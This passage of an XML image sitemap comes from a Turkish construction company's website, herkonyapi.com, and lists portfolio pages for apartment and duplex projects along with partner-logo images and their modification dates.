			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_9.jpg</image:loc>
			<image:title><![CDATA[New_9]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/9-3/</loc>
		<lastmod>2014-06-02T13:13:04+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/92.jpg</image:loc>
			<image:title><![CDATA[9]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/1-2/</loc>
		<lastmod>2014-06-02T13:13:27+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/11.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/5-2/</loc>
		<lastmod>2014-06-02T13:13:29+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/51.jpg</image:loc>
			<image:title><![CDATA[5]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/6-2/</loc>
		<lastmod>2014-06-02T13:13:31+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/61.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/10-2/</loc>
		<lastmod>2014-06-02T13:13:33+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/101.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/8-2/</loc>
		<lastmod>2014-06-02T13:15:32+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/81.jpg</image:loc>
			<image:title><![CDATA[8]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/1-3/</loc>
		<lastmod>2014-06-02T13:16:09+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/12.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/2-2/</loc>
		<lastmod>2014-06-02T13:16:10+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/21.jpg</image:loc>
			<image:title><![CDATA[2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/6-3/</loc>
		<lastmod>2014-06-02T13:16:12+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/62.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/attachment/12/</loc>
		<lastmod>2014-06-02T13:16:13+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/121.jpg</image:loc>
			<image:title><![CDATA[12]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-dubleks/new_2-2/</loc>
		<lastmod>2014-06-02T13:19:44+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_21.jpg</image:loc>
			<image:title><![CDATA[New_2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-dubleks/new_2-3/</loc>
		<lastmod>2014-06-02T13:20:07+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_22.jpg</image:loc>
			<image:title><![CDATA[New_2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-dubleks/new_4-2/</loc>
		<lastmod>2014-06-02T13:20:10+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_41.jpg</image:loc>
			<image:title><![CDATA[New_4]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-dubleks/new_5-2/</loc>
		<lastmod>2014-06-02T13:20:14+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_51.jpg</image:loc>
			<image:title><![CDATA[New_5]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-dubleks/new_6-2/</loc>
		<lastmod>2014-06-02T13:20:17+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_61.jpg</image:loc>
			<image:title><![CDATA[New_6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-giris-kat/1-4/</loc>
		<lastmod>2014-06-02T13:22:08+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/13.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-giris-kat/2-3/</loc>
		<lastmod>2014-06-02T13:22:44+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/22.jpg</image:loc>
			<image:title><![CDATA[2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-giris-kat/3-2/</loc>
		<lastmod>2014-06-02T13:22:46+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/31.jpg</image:loc>
			<image:title><![CDATA[3]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-giris-kat/6-4/</loc>
		<lastmod>2014-06-02T13:22:48+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/63.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-giris-kat/8-3/</loc>
		<lastmod>2014-06-02T13:22:49+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/82.jpg</image:loc>
			<image:title><![CDATA[8]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-kat-2/10-3/</loc>
		<lastmod>2014-06-02T13:23:46+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/102.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-kat-2/2-4/</loc>
		<lastmod>2014-06-02T13:24:13+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/23.jpg</image:loc>
			<image:title><![CDATA[2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-kat-2/3-3/</loc>
		<lastmod>2014-06-02T13:24:15+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/32.jpg</image:loc>
			<image:title><![CDATA[3]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-kat-2/6-5/</loc>
		<lastmod>2014-06-02T13:24:17+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/64.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-kat-2/8-4/</loc>
		<lastmod>2014-06-02T13:24:19+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/83.jpg</image:loc>
			<image:title><![CDATA[8]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-1-1/1-5/</loc>
		<lastmod>2014-06-02T13:30:18+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/14.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-1-1/3-4/</loc>
		<lastmod>2014-06-02T13:31:24+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/33.jpg</image:loc>
			<image:title><![CDATA[3]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-1-1/6-6/</loc>
		<lastmod>2014-06-02T13:31:26+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/65.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-1-1/9-4/</loc>
		<lastmod>2014-06-02T13:31:27+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/93.jpg</image:loc>
			<image:title><![CDATA[9]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-1-1/10-4/</loc>
		<lastmod>2014-06-02T13:31:29+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/103.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1/3-5/</loc>
		<lastmod>2014-06-02T13:32:06+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/34.jpg</image:loc>
			<image:title><![CDATA[3]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1/1-6/</loc>
		<lastmod>2014-06-02T13:32:22+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/15.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1/2-5/</loc>
		<lastmod>2014-06-02T13:32:24+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/24.jpg</image:loc>
			<image:title><![CDATA[2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1/7-2/</loc>
		<lastmod>2014-06-02T13:32:29+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/71.jpg</image:loc>
			<image:title><![CDATA[7]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1/10-5/</loc>
		<lastmod>2014-06-02T13:32:31+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/104.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1-on/1-7/</loc>
		<lastmod>2014-06-02T13:32:41+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/16.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1-on/6-7/</loc>
		<lastmod>2014-06-02T13:33:13+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/66.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1-on/8-5/</loc>
		<lastmod>2014-06-02T13:33:15+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/84.jpg</image:loc>
			<image:title><![CDATA[8]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1-on/9-5/</loc>
		<lastmod>2014-06-02T13:33:17+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/94.jpg</image:loc>
			<image:title><![CDATA[9]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1-on/10-6/</loc>
		<lastmod>2014-06-02T13:33:19+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/105.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-on-dubleks/2-6/</loc>
		<lastmod>2014-06-02T13:37:50+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/25.jpg</image:loc>
			<image:title><![CDATA[2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-on-dubleks/4-2/</loc>
		<lastmod>2014-06-02T13:38:11+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/41.jpg</image:loc>
			<image:title><![CDATA[4]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-on-dubleks/6-8/</loc>
		<lastmod>2014-06-02T13:38:13+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/67.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-on-dubleks/10-7/</loc>
		<lastmod>2014-06-02T13:38:15+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/106.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-on-dubleks/12-2/</loc>
		<lastmod>2014-06-02T13:38:17+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/122.jpg</image:loc>
			<image:title><![CDATA[12]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-arka-dubleks/10-8/</loc>
		<lastmod>2014-06-02T13:39:56+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/107.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-arka-dubleks/1-8/</loc>
		<lastmod>2014-06-02T13:40:13+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/17.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-arka-dubleks/2-7/</loc>
		<lastmod>2014-06-02T13:40:16+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/26.jpg</image:loc>
			<image:title><![CDATA[2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-arka-dubleks/5-3/</loc>
		<lastmod>2014-06-02T13:40:18+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/52.jpg</image:loc>
			<image:title><![CDATA[5]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-arka-dubleks/6-9/</loc>
		<lastmod>2014-06-02T13:40:20+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/68.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/neden-kentsel-donusum/bina-yenileme-11/</loc>
		<lastmod>2014-08-29T22:39:18+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/bina-yenileme-11.jpg</image:loc>
			<image:title><![CDATA[bina-yenileme-11]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/deprem-tedbirleri/deprem-gercegi/</loc>
		<lastmod>2014-08-29T22:41:28+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png</image:loc>
			<image:title><![CDATA[deprem-gercegi]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/baykaralar/</loc>
		<lastmod>2014-08-29T22:55:17+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png</image:loc>
			<image:title><![CDATA[baykaralar]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/canakkale_seramik/</loc>
		<lastmod>2014-08-29T22:55:18+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png</image:loc>
			<image:title><![CDATA[canakkale_seramik]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/day_yapi/</loc>
		<lastmod>2014-08-29T22:55:20+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png</image:loc>
			<image:title><![CDATA[day_yapi]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/kabinet/</loc>
		<lastmod>2014-08-29T22:55:22+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/kabinet.png</image:loc>
			<image:title><![CDATA[kabinet]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/klimaplus/</loc>
		<lastmod>2014-08-29T22:55:23+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png</image:loc>
			<image:title><![CDATA[KlimaPlus]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0000_mood/</loc>
		<lastmod>2014-08-29T22:55:26+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png</image:loc>
			<image:title><![CDATA[logo_0000_mood]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0001_drlight1/</loc>
		<lastmod>2014-08-29T22:55:28+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png</image:loc>
			<image:title><![CDATA[logo_0001_drlight1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0002_yutas1/</loc>
		<lastmod>2014-08-29T22:55:30+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png</image:loc>
			<image:title><![CDATA[logo_0002_yutas1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0003_vitra/</loc>
		<lastmod>2014-08-29T22:55:32+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png</image:loc>
			<image:title><![CDATA[logo_0003_vitra]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0004_viko1/</loc>
		<lastmod>2014-08-29T22:55:34+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png</image:loc>
			<image:title><![CDATA[logo_0004_viko1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0005_siemens1/</loc>
		<lastmod>2014-08-29T22:55:36+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png</image:loc>
			<image:title><![CDATA[logo_0005_siemens1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0007_seranit1/</loc>
		<lastmod>2014-08-29T22:55:38+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png</image:loc>
			<image:title><![CDATA[logo_0007_seranit1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0008_scavolini1/</loc>
		<lastmod>2014-08-29T22:55:40+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png</image:loc>
			<image:title><![CDATA[logo_0008_scavolini1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0009_rehau1/</loc>
		<lastmod>2014-08-29T22:55:42+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png</image:loc>
			<image:title><![CDATA[logo_0009_rehau1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0010_onalanlar1/</loc>
		<lastmod>2014-08-29T22:55:54+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png</image:loc>
			<image:title><![CDATA[logo_0010_onalanlar1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0011_lineadecor1/</loc>
		<lastmod>2014-08-29T22:55:56+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png</image:loc>
			<image:title><![CDATA[logo_0011_lineadecor1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0012_legrand1/</loc>
		<lastmod>2014-08-29T22:55:57+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png</image:loc>
			<image:title><![CDATA[logo_0012_legrand1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0013_kommerling1/</loc>
		<lastmod>2014-08-29T22:55:59+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png</image:loc>
			<image:title><![CDATA[logo_0013_kommerling1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0014_intema/</loc>
		<lastmod>2014-08-29T22:56:01+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png</image:loc>
			<image:title><![CDATA[logo_0014_intema]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0015_huni1/</loc>
		<lastmod>2014-08-29T22:56:04+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png</image:loc>
			<image:title><![CDATA[logo_0015_huni1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0016_hoppe1/</loc>
		<lastmod>2014-08-29T22:56:05+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png</image:loc>
			<image:title><![CDATA[logo_0016_hoppe1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0018_fibrobeton1/</loc>
		<lastmod>2014-08-29T22:56:07+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png</image:loc>
			<image:title><![CDATA[logo_0018_fibrobeton1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0019_betofiber1/</loc>
		<lastmod>2014-08-29T22:56:08+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png</image:loc>
			<image:title><![CDATA[logo_0019_betofiber1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0020_aparici1/</loc>
		<lastmod>2014-08-29T22:56:10+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png</image:loc>
			<image:title><![CDATA[logo_0020_aparici1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0021_innsu/</loc>
		<lastmod>2014-08-29T22:56:12+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png</image:loc>
			<image:title><![CDATA[logo_0021_innsu]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0022_eskiz/</loc>
		<lastmod>2014-08-29T22:56:13+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png</image:loc>
			<image:title><![CDATA[logo_0022_eskiz]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/logo_0023_toskar/</loc>
		<lastmod>2014-08-29T22:56:15+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png</image:loc>
			<image:title><![CDATA[logo_0023_toskar]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/md_prekast/</loc>
		<lastmod>2014-08-29T22:56:17+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png</image:loc>
			<image:title><![CDATA[md_prekast]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/okcam_mobilya/</loc>
		<lastmod>2014-08-29T22:56:18+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png</image:loc>
			<image:title><![CDATA[okcam_mobilya]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/pimapen-011/</loc>
		<lastmod>2014-08-29T22:56:20+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png</image:loc>
			<image:title><![CDATA[Pimapen-011]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/seldur_elektrik/</loc>
		<lastmod>2014-08-29T22:56:21+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png</image:loc>
			<image:title><![CDATA[seldur_elektrik]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/serifoglu-011/</loc>
		<lastmod>2014-08-29T22:56:23+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png</image:loc>
			<image:title><![CDATA[serifoglu-011]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/seyithanoglu_ahsap/</loc>
		<lastmod>2014-08-29T22:56:25+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png</image:loc>
			<image:title><![CDATA[seyithanoglu_ahsap]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/tepe_insaat_malzemeleri/</loc>
		<lastmod>2014-08-29T22:56:28+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png</image:loc>
			<image:title><![CDATA[tepe_insaat_malzemeleri]]></image:title>
		</image:image>
	</url>
	<url>
